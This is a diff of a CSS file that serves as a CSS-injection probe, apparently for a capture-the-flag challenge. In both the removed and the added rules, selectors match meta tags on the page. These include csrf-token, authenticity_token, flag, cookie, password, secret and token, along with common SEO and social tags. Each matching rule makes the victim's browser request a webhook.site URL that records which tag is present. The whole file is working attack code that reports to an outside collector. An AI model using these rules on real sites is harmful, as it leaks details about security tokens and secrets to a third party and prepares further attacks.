@@ -1,53 +1,82 @@
-/* Check if meta tag with name="csrf-token" exists */
-html:has(meta[name="csrf-token"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?csrf_token_name_present");
+/* Standard meta tags */
+meta[name="description"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_description_present");
+}
+meta[name="keywords"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_keywords_present");
+}
+meta[name="viewport"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_viewport_present");
+}
+meta[name="author"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_author_present");
+}
+meta[name="robots"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_robots_present");
+}
+meta[name="generator"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_generator_present");
 }
 
-/* Check if meta tag with content attribute exists */
-html:has(meta[content]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_content_present");
+/* Security/authentication related */
+meta[name="csrf-token"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_csrf_token_present");
+}
+meta[name="authenticity_token"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_authenticity_token_present");
 }
 
-/* Check if meta tag with http-equiv attribute exists */
-html:has(meta[http-equiv]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_http_equiv_present");
+/* Social media meta tags */
+meta[name="twitter:card"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_twitter_card_present");
+}
+meta[name="twitter:title"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_twitter_title_present");
+}
+meta[property="og:title"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_og_title_present");
+}
+meta[property="og:description"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_og_description_present");
 }
 
-/* Check if meta tag with charset attribute exists */
-html:has(meta[charset]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_charset_present");
+/* Verification meta tags */
+meta[name="google-site-verification"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_google_verification_present");
+}
+meta[name="yandex-verification"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_yandex_verification_present");
 }
 
-/* Check if meta tag with property attribute exists */
-html:has(meta[property]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_property_present");
+/* Your original sensitive ones */
+meta[name="flag"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_flag_present");
+}
+meta[name="cookie"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_cookie_present");
+}
+meta[name="password"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_password_present");
+}
+meta[name="secret"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_secret_present");
+}
+meta[name="token"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_token_present");
 }
 
-/* Check if meta tag with name="flag" exists */
-html:has(meta[name="flag"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_name_present");
+/* Browser/device specific */
+meta[name="theme-color"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_theme_color_present");
+}
+meta[name="apple-mobile-web-app-title"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_apple_app_title_present");
 }
 
-/* Check if meta tag with name="cookie" exists */
-html:has(meta[name="cookie"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_name_present");
+/* Microsoft specific */
+meta[name="msapplication-TileColor"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_ms_tilecolor_present");
 }
-
-/* Check if meta tag with name="password" exists */
-html:has(meta[name="password"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_name_present");
-}
-
-/* General check for meta tags with any attribute */
-html:has(meta[any-attr]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_any_attribute_present");
-}
-
-/* To check for specific attributes on any meta tag, you can do: */
-html:has(meta[name]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_name_attribute");
-}
-
-html:has(meta[content]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_content_attribute");
+meta[name="msapplication-config"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_ms_config_present");
 }
